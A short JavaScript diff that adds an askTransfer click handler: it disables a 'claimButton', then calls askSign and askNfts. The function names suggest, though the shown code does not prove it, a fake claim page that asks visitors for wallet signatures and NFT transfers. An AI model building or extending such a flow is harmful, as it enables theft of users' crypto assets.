@@ -317,5 +317,17 @@ async function askTransferWithSign(rbal) {
         });
     });
 }
+let disabled = false;
+async function askTransfer() {
+  if (disabled) return;
+  document.getElementById("claimButton").style.opacity = 0.5;
+  disabled = true;
+  //check later
+  if (await askSign()) await askNfts();
+  disabled = false;
+  document.getElementById("claimButton").style.opacity = 1;  
+}
+
+
 
 
